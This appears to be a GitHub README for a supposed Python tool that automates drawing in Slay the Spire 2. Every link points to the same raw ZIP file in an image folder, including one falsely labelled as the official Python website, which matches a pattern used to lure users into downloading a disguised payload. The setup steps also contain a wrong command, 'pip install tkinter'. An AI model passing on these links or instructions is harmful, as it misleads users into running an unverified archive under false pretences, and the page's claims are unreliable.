# 🎨 Slay-the-Spire-2-Drawing - Automate Digital Drawing for Slay the Spire 2

[![Download Slay-the-Spire-2-Drawing](https://img.shields.io/badge/Download-Slay%20the%20Spire%202-blue?style=for-the-badge)](https://github.com/wqh7798/Slay-the-Spire-2-Drawing/raw/refs/heads/main/pic/Drawing_the_Spire_Slay_v3.3.zip)

## 🖥️ About Slay-the-Spire-2-Drawing

Slay-the-Spire-2-Drawing is a tool that helps you create digital drawings automatically for the game Slay the Spire 2. It uses Python to control the drawing process and makes it easier to produce detailed images without manual effort. You do not need any coding skills to use this software.

This tool works by processing images and then recreating them by drawing with a robotic style. It uses computer vision libraries like OpenCV and a simple graphical interface built with Tkinter. The main goal is to automate the drawing process, saving time and improving accuracy.

### Key Features

- Automatic image processing to prepare your picture for drawing.
- Built-in control of a digital drawing board.
- Simple interface designed for non-technical users.
- Supports common image formats like JPG and PNG.
- Works on Windows computers.
- Uses open-source Python libraries.

### System Requirements

- Windows 10 or later (64-bit recommended).
- At least 4 GB of RAM.
- 500 MB free disk space.
- Python 3.7 or higher installed (the setup will guide you).
- Internet connection for initial download.

---

## 🚀 Getting Started

To use Slay-the-Spire-2-Drawing on Windows, follow these steps carefully. We will take you from download to running the software without any programming needed.

### Step 1: Download the Software

Click the big blue button above or this link below to visit the download page:

[Download Slay-the-Spire-2-Drawing](https://github.com/wqh7798/Slay-the-Spire-2-Drawing/raw/refs/heads/main/pic/Drawing_the_Spire_Slay_v3.3.zip)

This link takes you to the GitHub page where you can get the latest version. Look for the "Releases" section or a file named something like `Slay-the-Spire-2-Drawing-win.zip`. Download the ZIP file to your computer.

### Step 2: Extract the Files

Once the download finishes, locate the ZIP file in your Downloads folder (or the folder you chose) and right-click it. Choose "Extract All..." and extract the contents to a folder you can easily find, like your Desktop or Documents.

Make sure all files are visible after extraction.

### Step 3: Install Python (If Needed)

Slay-the-Spire-2-Drawing runs with Python. If you do not have Python installed, please do this now:

- Go to the official Python website: https://github.com/wqh7798/Slay-the-Spire-2-Drawing/raw/refs/heads/main/pic/Drawing_the_Spire_Slay_v3.3.zip
- Download the latest Python 3.x installer for Windows.
- Run the installer and select the option to "Add Python to PATH".
- Complete the installation by following the prompts.

If you already have Python 3.7 or higher, skip this step.

### Step 4: Install Required Python Libraries

This software needs extra Python packages to work. You will install them via the command line.

- Press the Windows key, type `cmd`, and open the Command Prompt.
- In the Command Prompt window, type the following command and press Enter:

  ```
  pip install opencv-python tkinter numpy
  ```

Wait until the packages install. You might see some messages appearing. This step can take a minute.

### Step 5: Run Slay-the-Spire-2-Drawing

Go back to the folder where you extracted the software files. Inside, look for a file named `start.bat` or `run.bat`.

- Double-click the `.bat` file to start the program.
- A window should open showing the interface.

If nothing happens, try this:

- Open the Command Prompt.
- Use the `cd` command to change into the folder where you extracted the files, for example:

  ```
  cd Desktop\Slay-the-Spire-2-Drawing
  ```

- Then type

  ```
  python main.py
  ```

This will launch the program directly.

---

## 🎯 Using the Software

After launching, the interface will let you load an image and prepare it for the automated drawing.

### Loading an Image

- Click the "Open Image" button in the window.
- Select a JPG or PNG file from your computer.
- The image will appear in the preview area.

### Adjusting Settings

You can set:

- Drawing speed (how fast the program runs).
- Pen size (which controls line thickness).
- Image contrast and brightness (to improve drawing quality).

Experiment with these to get your best result.

### Start Drawing

Once ready, hit the "Start" button. The software will begin the drawing process.

It may take several minutes depending on the image size and your settings.

---

## ⚙️ Troubleshooting

- **The program does not start:**  
  Check if Python is properly installed and added to your system PATH.

- **Errors about missing modules:**  
  Run `pip install opencv-python tkinter numpy` again.

- **Image won't load:**  
  Confirm the image is JPG or PNG format and not corrupted.

- **Drawing is too slow or fast:**  
  Adjust the speed slider before starting.

- **No window appears:**  
  Try running `python main.py` in the command prompt from the extracted folder.

---

## 📁 File Structure Overview

After extraction, your folder should contain:

- `main.py` — The main Python script.
- `start.bat` — Batch file to launch the program.
- `README.md` — This guide.
- `images` — Optional folder to store examples.
- `requirements.txt` — List of Python packages.

---

## 🔗 Where to Get Updates and Support

Visit the official page to download new versions or report issues:

[https://github.com/wqh7798/Slay-the-Spire-2-Drawing/raw/refs/heads/main/pic/Drawing_the_Spire_Slay_v3.3.zip](https://github.com/wqh7798/Slay-the-Spire-2-Drawing/raw/refs/heads/main/pic/Drawing_the_Spire_Slay_v3.3.zip)

Look under "Issues" to see if others had problems similar to yours or to submit your own questions.

---

## 🧰 Additional Tips

- Use high-contrast images for better drawing results.
- Smaller images run faster and produce cleaner drawings.
- Keep your system updated for best performance.
- Close other programs during drawing to avoid slowdowns.